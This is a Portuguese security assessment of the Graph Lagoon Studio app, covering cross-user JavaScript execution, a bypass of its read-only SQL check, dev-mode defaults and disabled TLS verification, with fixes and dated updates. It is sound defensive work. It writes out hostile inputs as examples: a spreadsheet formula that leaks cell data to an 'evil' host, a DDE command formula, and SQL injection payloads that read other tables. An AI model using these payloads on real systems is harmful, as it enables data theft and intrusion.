# Avaliação de Segurança — Graph Lagoon Studio

**Data:** 2026-08-26
**Versão avaliada:** `0.29.0` (backend `graphlagoon`, frontend Vue 3)
**Escopo:** backend FastAPI (`api/`), frontend (`frontend/`), deploy/config (Databricks Apps, CI/CD, submódulos)
**Método:** revisão estática de código com rastreamento das superfícies de autenticação, autorização, execução de query, execução de código no cliente, SSRF, segredos, cabeçalhos e supply-chain.

---

## 1. Sumário executivo

O sistema **nunca fica exposto na internet**: roda dentro da infraestrutura do Databricks, em rede privada, atrás de um proxy que autentica o usuário e injeta o cabeçalho `X-Forwarded-Email`. A **execução de queries genéricas (read-only) contra o warehouse é funcionalidade intencional**, não uma falha. Essas duas premissas rebaixam drasticamente a criticidade de toda uma classe de achados que seriam graves num serviço público (spoofing de cabeçalho, CORS `*`, SSRF, injeção de SQL "genérica").

O que **sobrevive** a esse modelo de ameaça — e por isso concentra o risco real — são três coisas:

1. **Ataque cruzado entre colegas via artefatos compartilhados.** O perímetro não protege um usuário contra outro. Um funcionário interno (ou uma conta comprometida) que compartilha uma *exploration* ou um *cluster program* malicioso executa **JavaScript arbitrário no navegador da vítima**, com a autoridade completa da origem da aplicação. Este é o risco dominante e o de maior severidade.
2. **Defaults que enfraquecem o perímetro por acidente.** `dev_mode=True` e `show_error_details=True` são os padrões de fábrica; o `app.yaml` de exemplo documentado **não** desliga o `dev_mode`. Um deploy que siga o exemplo à risca fica com a autenticação efetivamente desligada e com um endpoint destrutivo (`/api/dev/clear-all`) acessível a qualquer chamador.
3. **Proteção do segredo mais privilegiado do deploy.** A troca de token OAuth machine-to-machine (que carrega `client_secret` e recebe um bearer com escopo `all-apis`) é feita com **verificação de certificado TLS desligada** (`verify=False`).

Há ainda dois pontos onde o "query genérico por design" **atravessa a fronteira do intencional** e vira escrita/leitura fora do modelo de autorização — o bypass do validador read-only via `BEGIN...END` e a interpolação de SQL no router de catálogo. Esses **não** são "por design" e entram como alta severidade.

**Contagem por criticidade (recalibrada para o modelo de ameaça):**

| Criticidade | Qtde | Achados |
|---|---|---|
| 🔴 Crítica | 1 | C1 |
| 🟠 Alta | 5 | A1–A5 |
| 🟡 Média | 7 | M1–M7 |
| 🟢 Baixa | 9 | B1–B9 |

---

## 2. Modelo de ameaça e premissas

**Confiável (fora do escopo do atacante):**
- A infraestrutura Databricks, a rede privada e o proxy que injeta `X-Forwarded-Email`.
- Os operadores que fazem o deploy e definem as variáveis de ambiente.
- O canal de rede interno (TLS interno assumido presente, mas ver A2).

**Semi-confiável (é aqui que mora o risco):**
- **Funcionários autenticados.** Podem compartilhar artefatos entre si (explorations, contexts, cluster programs, presets). Um insider malicioso, ou — mais provável — uma conta legítima comprometida, é um vetor real. O perímetro não ajuda contra este ator.

**Intencional (não é vulnerabilidade):**
- Executar queries **read-only** arbitrárias contra o warehouse. O produto é uma ferramenta de exploração de grafos; queries genéricas são o ponto.

**Consequência da recalibragem:** um atacante externo anônimo praticamente não existe no modelo. Portanto:
- Spoofing de `X-Forwarded-Email`, CORS `*`, ausência de rate-limit, falta de CSP → severidade **reduzida** (dependem de já estar dentro da rede e/ou de contornar o proxy).
- Ataques usuário-contra-usuário e defaults que quebram o perímetro → severidade **mantida ou elevada**, porque são exatamente o que o perímetro não cobre.

---

## 3. Metodologia de classificação

Cada achado é pontuado por **(impacto × alcançabilidade dentro do modelo de ameaça)**:

- 🔴 **Crítica** — comprometimento de outro usuário ou do segredo mais privilegiado, alcançável por um insider/conta-comprometida com uma ação socialmente trivial, sem depender de contornar o perímetro.
- 🟠 **Alta** — escrita/destruição de dados, execução fora do modelo de autz, ou default que desliga o perímetro; alcançável por qualquer usuário autenticado ou por um deploy que siga a documentação.
- 🟡 **Média** — vazamento de informação sensível, injeção mitigada por uma segunda camada, ou fraqueza que exige contornar o proxy.
- 🟢 **Baixa** — hardening, defesa em profundidade, itens dev-only ou que exigem pré-condições improváveis na rede privada.

---

## 4. Tabela consolidada

| ID | Criticidade | Achado | Local | Ator |
|---|---|---|---|---|
| **C1** | 🔴 Crítica | Cluster programs executam JS não isolado (`new Function`) com autoridade total da origem; propagam-se silenciosamente para o *context* compartilhado da vítima | `frontend/src/stores/cluster.ts:305-315`, `:713-722` | Insider / conta comprometida |
| **A1** | 🟠 Alta | `dev_mode` default `True` → requisições anônimas viram `dev@graphlagoon.local`; `app.yaml` de exemplo não desliga; `/api/dev/clear-all` trunca todas as tabelas + warehouse | `api/graphlagoon/config.py:100`, `middleware/auth.py:106-123`, `routers/graph.py:819-864`, `docs/guide/databricks-apps.md:137-148` | Qualquer chamador (se default vazar) |
| **A2** | 🟠 Alta | `verify=False` na troca OAuth M2M — expõe `client_secret` e o bearer `all-apis` a MITM | `api/graphlagoon/services/databricks_oauth.py:94` | Atacante na rota interna |
| **A3** | 🟠 Alta | Bypass do validador read-only via prefixo `BEGIN...END` → DML/DDL no warehouse como service principal | `api/graphlagoon/services/datasource/sql_warehouse.py:123-126,207-215` | Usuário autenticado |
| **A4** | 🟠 Alta | Router de catálogo interpola parâmetros de query em SQL sem validação → leitura fora do modelo de autz | `api/graphlagoon/services/warehouse.py:613,657,708` ← `routers/catalog.py` | Usuário autenticado |
| **A5** | 🟠 Alta | Warehouse acessado por um único service principal com escopo OAuth `all-apis`; sem enforcement per-user do Unity Catalog | `api/graphlagoon/services/databricks_oauth.py:90` | (Risco sistêmico) |
| **M1** | 🟡 Média | IDOR: `GET /api/graph-contexts/{id}` sem checagem de acesso — vaza nomes de tabela, schema, dono e roster de compartilhamento | `api/graphlagoon/routers/graph_contexts.py:334-368` | Usuário autenticado |
| **M2** | 🟡 Média | `show_error_details=True` default → traceback completo nas respostas de erro | `api/graphlagoon/config.py:102`, `app.py:104` | Usuário autenticado |
| **M3** | 🟡 Média | Valores de propriedade de nó entram sem filtro em SQL executado via `paramBindings` de ações de menu | `frontend/src/composables/useConfigurableMenuActions.ts:39-61` → `useTemplateExecution.ts:36` | Insider (via context compartilhado) |
| **M4** | 🟡 Média | CSV/TSV export sem mitigação de fórmula (`= + - @`) — 4 caminhos | `frontend/src/utils/tableExport.ts:8-14` e 3 outros | Insider (via dado do grafo) |
| **M5** | 🟡 Média | Identidade é `X-Forwarded-Email` não verificado; superuser é concedido por string; CORS `*` + `allow_credentials=True` | `middleware/auth.py:98-123`, `app.py:756-763`, `main.py:40-41` | Ator que contorne o proxy |
| **M6** | 🟡 Média | Caminho Postgres puro não força SSL (Lakebase força) | `api/graphlagoon/db/database.py:57-66` vs `db/lakebase.py:126` | Atacante na rota (se Postgres externo) |
| **M7** | 🟡 Média | Job async e `statement_id` não são owner-scoped (mitigado por UUID de 122 bits) | `api/graphlagoon/routers/graph.py:645-727` | Usuário autenticado (força-bruta inviável) |
| **B1** | 🟢 Baixa | Sem CSP / `frame-ancestors` / `X-Frame-Options` | `frontend/index.html`, `api/graphlagoon/templates/index.html` | — |
| **B2** | 🟢 Baixa | ReDoS via regex de template de label, avaliado por nó por render | `frontend/src/utils/labelFormatter.ts:44-48` | Insider (via label compartilhado) |
| **B3** | 🟢 Baixa | Configs de ação de menu não revalidadas no hydrate do backend (runtime check segura) | `frontend/src/stores/contextMenuActions.ts:32-39` | Usuário com escrita no context |
| **B4** | 🟢 Baixa | Injeção de shell via `${{ inputs.version }}` em `run:` do release, antes do publish PyPI | `.github/workflows/release.yml:40,51-55,84` | Quem tem write no repo |
| **B5** | 🟢 Baixa | Actions de terceiros não fixadas por SHA; download de binário gitleaks sem checksum | `release.yml:72,87`; `ci.yml:18` | Supply-chain |
| **B6** | 🟢 Baixa | Forks vendorizados (submódulos) embarcados no bundle, fora do `npm audit`/lockfile | `.gitmodules:1-9`, `frontend/vite.config.ts:9-14` | Supply-chain |
| **B7** | 🟢 Baixa | Credenciais fracas default de DB propagadas em defaults/docs/compose (dev-only) | `config.py:32`, `docker-compose.yml:7-8,26` | Dev-only |
| **B8** | 🟢 Baixa | E-mail pessoal como superuser default no `.env.example` | `api/.env.example:76` | Quem copiar o exemplo |
| **B9** | 🟢 Baixa | `debugpy` faz bind em `0.0.0.0` quando a flag de env está setada | `api/graphlagoon/main.py:24-33`, `warehouse/src/main.py:15` | Opt-in dev |

---

## 5. Detalhamento

### 🔴 C1 — Cluster programs: RCE-no-navegador entre colegas

**O que é.** Cluster programs são JavaScript escrito pelo usuário. São executados com `new Function` na **thread principal**, sem sandbox, sem Worker, sem iframe — o único site de `eval`/`Function` de todo o frontend:

```js
// frontend/src/stores/cluster.ts:305-315
const fn = new Function('context', `
  'use strict';
  const { nodes, edges, selectedNodeIds, selectedEdgeIds, params } = context;
  // User code:
  ${program.code}
`)
const result = fn(context)
```

O código roda com **autoridade ambiente completa da origem**: `window`, `document`, `fetch`/`XMLHttpRequest`, `localStorage` (que guarda `userEmail`), `document.cookie`, e o próprio cliente axios autenticado da app. Como o frontend é *same-origin* com o backend, o programa faz chamadas de API **como a vítima**. A validação de retorno (`node_ids`, `figure`, `state`) ocorre **depois** de o código já ter rodado — restringe a saída, nunca os efeitos colaterais.

**Por que sobrevive ao modelo de ameaça.** O perímetro (rede privada + proxy) não faz nada contra um usuário atacando outro. E o vetor de propagação é o que torna isto crítico e não apenas "alto":

```js
// frontend/src/stores/cluster.ts:713-722 — programa de exploration compartilhada
} else if (saved.scope === 'context') {
  programs.value.push(saved); importedToContext = true
} else { // legacy sem scope
  if (contextWritable()) { programs.value.push({ ...saved, scope: 'context' }); importedToContext = true }
}
...
if (importedToContext) { persistProgramsToContext() }
```

Cadeia de ataque: atacante A compartilha uma *exploration* (compartilhamento suporta `*@domínio` e público) → vítima B, com escrita no context, a abre → o JS de A é **silenciosamente gravado no context compartilhado** e passa a ser servido a **todos** os usuários daquele context. Nenhum prompt, nenhuma confirmação.

A execução em si exige **um clique** (botão Run, item de menu de contexto, ou "run detection" na aba Communities) — mas um item de menu nomeado "Group by Department" no menu de contexto compartilhado é indistinguível de um legítimo. É RCE-no-navegador a um clique de distância, socialmente trivial.

**Sem limite de tamanho nem revisão** no save (`ClusterProgramEditorModal.vue:94` só checa `length > 0`).

**Remediação (a de maior alavancagem do relatório inteiro):**
1. **Mover a execução para um Web Worker dedicado** — sem DOM, sem `fetch` (CSP `connect-src 'none'` no worker), I/O apenas por structured-clone, com **timeout de execução**. O contrato já é puro e serializável (`context` entra, `Cluster[]` sai), então é um refactor contido. Isso também **desbloqueia uma CSP real** (ver B1).
2. Enquanto o Worker não existe: exigir **confirmação explícita** ("este programa foi criado por `A`; executar?") na primeira execução de um programa importado de exploration/context de terceiro, e **não** propagar automaticamente para o context no `loadState` (remover o `persistProgramsToContext()` silencioso — tornar a importação um ato deliberado da vítima).
3. Registrar autor (`created_by`) em cada programa e exibi-lo no painel e no item de menu.

---

### 🟠 A1 — `dev_mode` default `True` + endpoint destrutivo

> **Atualização 2026-08-28 (área admin):** `DELETE /api/dev/clear-all` agora exige `dev_mode` **e** superusuário (`require_superuser`), preserva `usage_logs` e grava `admin.clear_all` na auditoria; o `.env.example` deixou de listar um e-mail pessoal (B8) e usa `dev@graphlagoon.local`. O default `dev_mode=True` e o `app.yaml` de exemplo continuam em aberto. A tabela `usage_logs`, antes inerte, passou a ser a trilha de auditoria de deletes/shares/transfers/publishes. Também corrigido: `get_current_user` ignorava o `user_provider` de `configure_auth` (header forjável em deploy embutido sem `AuthMiddleware`) e a falha de auth no middleware virava 500 em vez de 403 (parte de M2).

`dev_mode: bool = Field(default=True)` (`config.py:100`). Com isso, quando `GRAPH_LAGOON_DEV_MODE=false` **não** está no ambiente:

```python
# middleware/auth.py:106-123
if not user_email:
    if settings.dev_mode:
        user_email = DEV_DEFAULT_EMAIL   # "dev@graphlagoon.local"
    else:
        raise HTTPException(status_code=403, ...)
```

Toda requisição anônima é autenticada como o usuário dev, **e** os endpoints `/api/dev/random-graph` e `/api/dev/clear-all` ficam vivos. O `clear-all` roda `TRUNCATE TABLE {t} CASCADE` em `users, graph_contexts, explorations, shares, usage_logs` **e** limpa as tabelas do warehouse (`graph.py:854`). Qualquer chamador destrói todos os dados.

O agravante é documental: o `app.yaml`/`app.py` de exemplo em `docs/guide/databricks-apps.md:72-82,137-148` **nunca seta `GRAPH_LAGOON_DEV_MODE=false`**. Os arquivos `api/.env.databricks*` setam, mas o caminho do Databricks App (o de produção) não. Um operador que siga a doc fica exposto. A própria doc reconhece o risco (`python-api.md:160-163`).

**Remediação:**
1. Inverter o default: `dev_mode=False`. Deve ser um opt-in explícito, nunca o padrão de fábrica.
2. Guardar `/api/dev/*` atrás de `dev_mode` **e** de um flag adicional (`GRAPH_LAGOON_ENABLE_DEV_ENDPOINTS`), e removê-los do build de produção.
3. Adicionar `GRAPH_LAGOON_DEV_MODE=false` ao `env` do `app.yaml` de exemplo e ao `app.py` de exemplo.

---

### 🟠 A2 — TLS desligado na troca OAuth (segredo mais privilegiado)

> **✅ Corrigido 2026-09-04:** a troca OAuth agora verifica TLS por default.
> Novo setting `databricks_tls_verify` (default `True`, classificado
> `public` no registro admin) como escape hatch explícito para CA interna —
> seguindo o padrão existente `neptune_tls_verify`. Evidência de que o
> `verify=False` era acidental: o cliente do warehouse fala com o mesmo
> host com `verify=True` desde sempre.

```python
# api/graphlagoon/services/databricks_oauth.py:94
async with httpx.AsyncClient(verify=False) as client:
    response = await client.post(token_url, data=data, auth=auth, ...)
```

Essa é exatamente a requisição que carrega `client_id`/`client_secret` (HTTP Basic) e recebe o bearer de escopo `all-apis` — o token mais poderoso do deploy. `verify=False` desliga a validação de certificado. Na rede privada a probabilidade de MITM/DNS-spoof é menor, mas o impacto (roubo do credential que dirige *qualquer* REST API do Databricks) é catastrófico e **não há razão** para desligar verify aqui. Note o contraste: os clientes Neptune e REST honram `verify_tls` com default `True`.

**Remediação:** remover `verify=False` (usar o default `True`); se houver CA interna, apontar `SSL_CERT_FILE`/`verify=<ca-bundle>` em vez de desligar. Adicionar erro claro quando `DATABRICKS_HOST` for `None` (hoje quebra tarde em `rstrip`).

---

### 🟠 A3 — Bypass do read-only via `BEGIN...END`

> **✅ Corrigido 2026-09-04:** `prepare_sql` rejeita script `BEGIN...END`
> com 400 `SCRIPT_NOT_ALLOWED` **por default**, atrás da feature flag
> `allow_raw_sql_scripts` (opt-in do operador). Os 3 fluxos do frontend que
> transpilavam no cliente e postavam o script no `/query` (review no
> GraphQueryPanel, restore de exploração sem snapshot, templates) foram
> reroteados para os endpoints Cypher, onde o script é gerado no servidor
> e fica ligado ao contexto por construção — então Cypher procedural
> continua funcionando para todos, flag ligada ou não.
>
> **Por que a forma do statement é o critério.** A referência do Databricks
> confirma que o corpo de um compound statement aceita DML
> (`INSERT`/`UPDATE`/`DELETE`/`MERGE`) e, em blocos não-atômicos, DDL e DCL;
> e `EXECUTE IMMEDIATE` executa uma string montada em runtime. Logo nem o
> validador SELECT-only (sqlglot não decompõe o bloco) nem o novo checador
> de escopo de tabela conseguem inspecionar um script — provar "este
> programa só lê" é indecidível com SQL dinâmico. Alternativas rejeitadas:
> parsear o corpo (falha exatamente no `EXECUTE IMMEDIATE`, dando falsa
> segurança) e HMAC no transpile (complexidade/rotação).
>
> **Contrato da flag:** com ela ligada, scripts pulam validação E escopo —
> os grants read-only do Unity Catalog passam a ser a única camada que
> impede escrita. Documentado em `configuration.md` e `permissions.md`.
> Testes: `api/tests/test_script_rejection.py`.

O validador `validate_sql_query` (sqlglot, dialeto Spark) rejeita `Insert/Update/Delete/Drop/Create/Alter/Truncate/Grant/...` e é aplicado a todos os caminhos de query. Mas:

```python
# sql_warehouse.py:123-126, 207-215
def _is_script(sql: str) -> bool:
    stripped = sql.strip().upper()
    return stripped.startswith("BEGIN") and stripped.endswith("END")
...
    is_script = _is_script(data.query)
    if not is_script:
        is_valid, error_msg = validate_sql_query(data.query)
```

Qualquer corpo enviado a `POST /api/graph-contexts/{id}/query` (ou `/query/async`) que **comece com `BEGIN` e termine com `END`** pula a validação inteiramente e é encaminhado literalmente ao warehouse. Compound statements do Databricks suportam `EXECUTE IMMEDIATE`, `CREATE/DROP`, `INSERT`, `DELETE`. Aqui o "query genérico por design" (que era read-only) **atravessa para escrita/DDL** como o service principal. Este é o ponto onde a funcionalidade intencional vira falha.

**Remediação:** o bloco procedural (BFS) que legitima o `BEGIN...END` deve ser gerado/assinado internamente, não reconhecido por prefixo de texto vindo do usuário. Opções: (a) marcar o SQL gerado internamente com um token fora de banda em vez de heurística de prefixo; (b) validar o corpo do `BEGIN...END` com um parser que rejeite statements de escrita mesmo dentro do bloco; (c) restringir escrita no nível do próprio warehouse (grants read-only no SP para os catálogos visualizados — ver A5).

---

### 🟠 A4 — Interpolação de SQL no router de catálogo

> **✅ Corrigido 2026-09-04 (injeção + escopo):** novo módulo
> `services/sql_identifiers.py` (regex `^[A-Za-z0-9_]+$` + backtick-quote
> com escape) aplicado em todos os f-strings de identificador: router de
> catálogo (400 `INVALID_IDENTIFIER` na borda), `warehouse.py` (SHOW/
> DESCRIBE/SELECT/discover_schema), e a variante armazenada —
> `parse_qualified_table` agora rejeita partes hostis (fecha injeção via
> config de contexto) e os builders de subgraph/expand escapam colunas e
> validam+quotam nomes de tabela. O router de catálogo inteiro também
> ganhou o gate `context.create` (antes: qualquer autenticado enumerava e
> pré-visualizava qualquer tabela).
>
> E o problema maior que A4 só tangenciava — ler tabela fora do contexto —
> passou a ter **enforcement real**: `services/sql_scope.py` extrai as
> tabelas do statement com sqlglot (JOIN, subquery, UNION; CTE não conta
> como tabela) e aplica dois tiers. Quem tem `context.create` lê qualquer
> tabela nos `catalog.schema` da allowlist; quem não tem lê **apenas as
> tabelas do contexto aberto**. O `cte_prefilter` — SQL bruto do cliente que
> é spliced em TODOS os modos, inclusive dentro de scripts procedurais
> opacos — é checado **na origem**, enquanto ainda é parseável; sem isso um
> reader lia tabela alheia via `{"query": "MATCH ...", "cte_prefilter":
> "MY_FINAL_EDGES AS (SELECT * FROM hr.private.salaries)"}`. Cypher sem
> prefilter dispensa o check (o transpiler só nomeia as tabelas do
> contexto), e datasources não-SQL (Neptune/REST) são isentos por não terem
> tabelas a escopar. Isto **revisa a premissa do §2**: query
> read-only arbitrária continua intencional, mas agora dentro de um escopo
> declarado, não sobre tudo que a credencial alcança. Testes:
> `api/tests/test_sql_scope.py`, `test_sql_identifiers.py` + casos de rota
> em `test_permission_routes.py` e `test_schema_drift.py`.

```python
# warehouse.py:613,657,708 — parâmetros vindos direto da query string
statement=f"SHOW TABLES IN {catalog}.{database}"
statement=f"DESCRIBE TABLE {full_table_name}"
statement=f"SELECT * FROM {full_table_name} LIMIT {limit}"
```

`catalog`, `database`, `table` chegam de parâmetros de URL (`catalog.py:36-72,99-110`) sem quoting, escaping ou `validate_sql_query`. Um usuário autenticado molda a cláusula `FROM` (`?table=x WHERE 1=0 UNION SELECT * FROM sensitive.table AS t --`) e lê **qualquer coisa que o service principal possa ler**, inteiramente fora do modelo de context/sharing. O Databricks rejeita multi-statement, então é leitura, não escrita — mas leitura fora da autz não é "por design".

**Remediação:** validar `catalog`/`database`/`table` contra um regex de identificador (`^[A-Za-z0-9_]+$`) e/ou contra a allowlist `catalog_schemas` já existente na config; aplicar backtick-quoting com escape. Idealmente restringir aos catálogos/schemas configurados.

---

### 🟠 A5 — Um único service principal com escopo `all-apis`

> **Atualização 2026-09-04 (mitigações parciais):** (b) virou guia oficial —
> `docs/guide/databricks-apps.md` agora manda conceder **só `SELECT`** nos
> catálogos visualizados, com o aviso explícito de que os grants do SP são
> o perímetro externo e a única camada que segura um script `BEGIN...END`.
> No app, o escopo de leitura deixou de depender só da credencial: dois
> tiers por `context.create` + allowlist de `catalog.schema` (ver A4).
> Clamp opcional `max_query_rows` (Databricks `row_limit`) no choke point
> do warehouse. (c) — OBO com `sql:restricted-query` — segue como evolução
> futura: resolveria A5 e tornaria script seguro por construção (a query
> roda com os grants do próprio usuário). O `scope=all-apis` do M2M
> permanece (o fluxo M2M do Databricks não aceita escopo menor).

Todas as queries de warehouse rodam como uma **identidade única da app**, nunca como o usuário final, com **`scope: "all-apis"`** (`databricks_oauth.py:90`) — o escopo OAuth mais amplo. Consequências: os grants per-user do Unity Catalog **não são aplicados** (todo mundo compartilha o acesso do SP), e o mesmo credential dirige qualquer REST API do Databricks. Isto é arquitetural e em parte inerente ao modelo de Databricks Apps, mas amplifica A3/A4: o que vazar por eles roda com o acesso máximo.

**Remediação:** (a) reduzir o escopo OAuth ao mínimo necessário (evitar `all-apis` se um escopo de SQL bastar); (b) conceder ao SP apenas grants **read-only** e apenas nos catálogos/schemas realmente visualizados — isso transforma A3 num não-evento no nível do warehouse; (c) avaliar, quando o Databricks suportar no runtime de Apps, um fluxo on-behalf-of para herdar as ACLs do usuário.

---

### 🟡 M1 — IDOR em `GET /api/graph-contexts/{id}`

```python
# routers/graph_contexts.py:334-368
async def get_graph_context(context_id: UUID, request: Request):
    """Get a specific graph context (all contexts are globally accessible)."""
    user_email = get_current_user(request)
    ...
    return context_to_response(context, user_email)
```

Sem checagem de posse/compartilhamento — o docstring assume o vazamento. Qualquer usuário autenticado com um UUID de context obtém `owner_email`, `edge_table_name`, `node_table_name`, estrutura de colunas, `shared_with` (todos os grantees), `cluster_programs` e `context_menu_actions`. Todos os outros endpoints de context (`PUT`/`DELETE`/`/share`) checam. Vaza nomes de tabela do warehouse e o roster de compartilhamento.

**Remediação:** aplicar `get_context_with_access`/`can_read` como nos demais endpoints. Se "globalmente legível" for intencional, ao menos omitir `owner_email`, `shared_with` e nomes de tabela para não-membros.

---

### 🟡 M2 — Tracebacks nas respostas por default

```python
# app.py:104-106  (show_error_details default True em config.py:102)
if show_error_details:
    details["exception_type"] = type(exc).__name__
    details["traceback"] = tb_str.split("\n")
```

Toda exceção não tratada retorna o traceback completo (caminhos de arquivo, layout de módulos, SQL). Some-se a isso a ordem de middleware: o `HTTPException(403)` da falha de auth é lançado **fora** do handler de HTTP-exception e degrada para **500 com traceback**. Vazamento de informação; num ambiente interno é médio, não alto.

**Remediação:** `show_error_details` default `False`; logar o traceback server-side e retornar um id de correlação ao cliente. Corrigir a ordem de middleware para o 403 sair como 403.

---

### 🟡 M3 — Valores de propriedade → SQL via `paramBindings`

`substituteTemplateParams` é um splice de texto puro, e um caller alimenta-o com **valores de propriedade de nó**, não só entrada tipada:

```
useConfigurableMenuActions.ts:39-61 (resolveTemplateParamValues → formatLabel sobre item.properties)
  → useTemplateExecution.executeTemplateAsGraph (useTemplateExecution.ts:36,45,60-68)
```

Uma propriedade contendo `'; DROP ...` flui para a query executada. O caminho `?template=` tem `SAFE_VALUE_RE`; o caminho de binding via menu de contexto e o modal de execução são **permissivos** por comentário explícito. A única barreira restante é o validador read-only do backend — que **também é contornável** (A3). Combinado, vira o M mais preocupante.

**Remediação:** aplicar validação equivalente a `SAFE_VALUE_RE` aos `paramBindings` derivados de propriedade; parametrizar de verdade no backend em vez de splice textual.

---

### 🟡 M4 — CSV/TSV export sem mitigação de fórmula

Nenhum dos 4 caminhos neutraliza células iniciando com `= + - @`:
- `frontend/src/utils/tableExport.ts:8-14` (TSV do Query Console)
- `ClusterNodeModal.vue:110-127`, `CommunityNodeModal.vue:112-127` (CSV manual)
- `DataTablePanel.vue:318-319` / `DataGrid.vue:97-98` (PrimeVue `exportCSV()` sem `exportFunction`)

Valores de propriedade do grafo vão direto para as células, então uma linha do warehouse com `=HYPERLINK("http://evil/?"&A1,"Click")` ou `=cmd|'/c calc'!A1` chega ao Excel de um colega. Cross-user via dado — sobrevive ao modelo de ameaça.

**Remediação:** prefixar com `'` (ou espaço) qualquer célula que comece com `= + - @ \t \r` no `escapeField`, e fornecer `:exportFunction` nas duas DataTables.

---

### 🟡 M5 — Identidade por cabeçalho não verificado + CORS `*` + credentials

`X-Forwarded-Email` é confiado sem assinatura/JWT e sem allowlist de proxy; superuser é concedido puramente por match de string (`utils/authz.py:12-16`). CORS é `allow_origins=["*"]` **com** `allow_credentials=True` (`app.py:756-763`, `main.py:40-41`). **No modelo de ameaça (proxy é o único caminho de rede), isto é médio, não crítico** — depende de alguém alcançar o processo ASGI direto, contornando o proxy (outro workload na mesma rede, ou pivot via SSRF). Mas é a fundação de toda a autz, então merece hardening.

**Remediação:** (a) restringir CORS às origens reais em produção (o parâmetro `cors_origins` já existe em `create_app`; `main.py` deveria usá-lo); (b) validar que a requisição vem do proxy (mTLS interno, IP allowlist, ou header secreto compartilhado com o proxy); (c) documentar que nada além do proxy pode alcançar a porta.

---

### 🟡 M6 — Postgres puro sem SSL

O engine Postgres puro (`db/database.py:57-66`) não passa `connect_args`/`ssl`; TLS depende do que o operador colocar na `database_url` (e asyncpg não exige). O Lakebase força (`db/lakebase.py:126` `"ssl": "require"`). Médio se um Postgres externo for usado; baixo se for só Lakebase.

**Remediação:** exigir/`ssl=require` por default no caminho puro quando o host não for `localhost`.

---

### 🟡 M7 — Job async / `statement_id` não owner-scoped

`GET .../query/job/{job_id}` e `.../query/table/{statement_id}` validam acesso ao `context_id` do path, mas não que o job/statement pertence àquele usuário (`graph.py:645-727`). Ids são `uuid4`/UUIDs do Databricks (122 bits), então a exploração exige adivinhar um valor inviável — risco prático baixo, listado por completude.

**Remediação:** associar `owner_email` ao criar o job e checar no fetch.

---

### 🟢 Baixa (hardening)

- **B1 — Sem CSP/`frame-ancestors`/`X-Frame-Options`.** Uma CSP `script-src 'self'` quebraria os cluster programs por design — o que é o *forcing function* correto: resolver C1 com Worker desbloqueia a CSP. Adicionar `frame-ancestors 'none'` já é seguro hoje.
- **B2 — ReDoS em regex de label** (`labelFormatter.ts:44-48`), mitigado por `MAX_REGEX_LENGTH`/flags; backtracking catastrófico dentro do limite ainda congela a aba. Considerar timeout/engine linear.
- **B3 — Configs de menu não revalidadas no hydrate** (`contextMenuActions.ts:32-39`); o runtime check em `safeUrl.ts:71` segura. **Não remover** esse check.
- **B4 — Injeção de shell em `release.yml`** via `${{ inputs.version }}` interpolado em `run:`, antes do publish PyPI. Gated por write-access. Passar via `env:` e usar `"$VERSION"`.
- **B5 — Actions não fixadas por SHA** e download de gitleaks sem checksum. Pinar por SHA; verificar checksum.
- **B6 — Forks vendorizados (submódulos)** compilados no bundle, fora do `npm audit`. Auditar manualmente e documentar processo de atualização.
- **B7 — Credenciais fracas default de DB** (`sgraph/sgraph`, `neo4j/graphlagoon`) em defaults/docs/compose. Dev-only; garantir que nenhuma vaze para produção.
- **B8 — E-mail pessoal como superuser default** em `.env.example:76` (`devmessias@gmail.com`). Trocar por placeholder.
- **B9 — `debugpy` bind `0.0.0.0`** quando a flag de env é setada. Opt-in; bind em `127.0.0.1`.

---

## 6. Plano de remediação faseado

### Fase 1 — Antes do próximo deploy (bloqueadores)
1. **C1** — implementar confirmação explícita + registro de autor + remover a propagação silenciosa para o context (`persistProgramsToContext` no `loadState`). *(O Worker-sandbox pode vir na Fase 2, mas a propagação silenciosa e a auto-importação precisam sair já.)*
2. **A1** — `dev_mode=False` default; `/api/dev/*` atrás de flag dedicado e fora do build de produção; setar `GRAPH_LAGOON_DEV_MODE=false` no `app.yaml`/`app.py` de exemplo.
3. ~~**A2** — remover `verify=False` da troca OAuth.~~ ✅ 2026-09-04
4. ~~**A3** — parar de reconhecer `BEGIN...END` por prefixo de texto do usuário; marcar/validar o SQL procedural interno.~~ ✅ 2026-09-04
5. ~~**A4** — validar/allowlist `catalog`/`database`/`table` no router de catálogo.~~ ✅ 2026-09-04

### Abordagem em camadas — permissão de queries (referência, 2026-09-04)

Como o problema "usuário consulta tabela fora do contexto / executa DML" é
tratado, camada por camada:

| Camada | Controle | Contra o quê | Status |
|---|---|---|---|
| App — validação | `validate_sql_query` (sqlglot, SELECT-only, single-statement) + `BEGIN...END` recusado no caminho raw por default (`SCRIPT_NOT_ALLOWED`, flag `allow_raw_sql_scripts` para reabrir) | DML/DDL | ✅ |
| App — validação | `services/sql_identifiers.py` (regex + backtick-escape) em todo f-string de identificador | Injeção via URL params e via config de contexto armazenada | ✅ |
| App — escopo | `services/sql_scope.py`: tabelas extraídas do statement e checadas contra 2 tiers (`context.create` ⇒ allowlist de catalog.schema; senão ⇒ só as tabelas do contexto aberto) | **Leitura de tabela fora do contexto/allowlist** | ✅ enforced |
| App — autorização | `context.create` gateia criar contexto, navegar catálogo e o tier largo de query | Quem autora e quem só explora | ✅ |
| App — contenção | `max_query_rows` (Databricks `row_limit`) no choke point do warehouse | Exfiltração em massa / custo | ✅ opcional, default off |
| Databricks — credencial | Grants **read-only** (`SELECT` + `CAN USE`) só nos catálogos visualizados | Neutraliza qualquer bypass de escrita no nível do warehouse | 📖 guia em `databricks-apps.md`; responsabilidade do operador |
| Databricks — identidade | OBO (`x-forwarded-access-token`, scope `sql:restricted-query`): queries read-only sob as permissões UC **do usuário final** (row filters/column masks) | Resolve A5 por arquitetura | ⏳ futuro — exigiria `header_provider` por request |

Nota de escopo (revisa o §2): query read-only arbitrária continua sendo o
produto, mas **dentro de um escopo declarado**. O que a app garante por
parsing é *onde* se pode ler; o que ela não consegue garantir por parsing é
*read-only dentro de um script* — isso é propriedade da credencial (grants)
ou, no futuro, da identidade (OBO).

### Fase 2 — Hardening estrutural (próximo ciclo)
6. **C1 (definitivo)** — mover `new Function` para Web Worker isolado (sem DOM, `connect-src 'none'`, timeout) e adotar CSP real (**B1**).
7. **A5** — reduzir escopo OAuth; grants read-only no SP restritos aos catálogos visualizados.
8. **M1** — checagem de acesso em `GET /graph-contexts/{id}`.
9. **M2** — `show_error_details=False` default + id de correlação; corrigir ordem de middleware.
10. **M3** — validar `paramBindings` derivados de propriedade; parametrizar no backend.
11. **M4** — mitigação de fórmula CSV nos 4 caminhos.
12. **M5** — CORS restrito em produção + verificação de proveniência do proxy.

### Fase 3 — Higiene contínua
